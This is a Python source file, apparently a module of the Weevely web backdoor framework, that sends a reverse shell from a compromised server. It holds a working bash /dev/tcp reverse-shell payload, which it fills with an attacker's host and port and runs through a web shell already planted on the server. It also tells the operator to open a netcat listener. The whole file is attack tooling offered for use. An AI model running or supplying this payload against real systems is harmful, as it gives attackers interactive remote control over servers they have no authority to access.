'''
Created on 28/ago/2011

@author: norby
'''

'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException

classname = 'Reversetcp'
    
class Reversetcp(Module):
    """Send reverse shell using TCP connection  
    :backdoor.reverse_tcp ip port 
    """
    
    
    
    vectors = { 
               'shell.sh' : { "/dev/tcp"       : "/bin/bash -c \'/bin/bash 0</dev/tcp/%s/%s 1>&0 2>&0\'"
                }
    
    }
    

    def __init__( self, modhandler , url, password):


        Module.__init__(self, modhandler, url, password)
        
        self.usersinfo = {}
        
                
    def run(self,host, port):
        
        
        for interpreter in self.vectors:
            for vector in self.vectors[interpreter]:
                if interpreter in self.modhandler.loaded_shells:
                    payload = self.vectors[interpreter][vector] % (host, port)
                    
                    print "[backdoor.reverse_tcp] Weevely should now block during reverse backdoor usage. If not, assure"
                    print "[backdoor.reverse_tcp] you are correctly bounding local port (use \'nc -v -l -p %s\')" % (port)

                    
                    self.modhandler.load(interpreter).run(payload, False)
                    


#        


    
    
    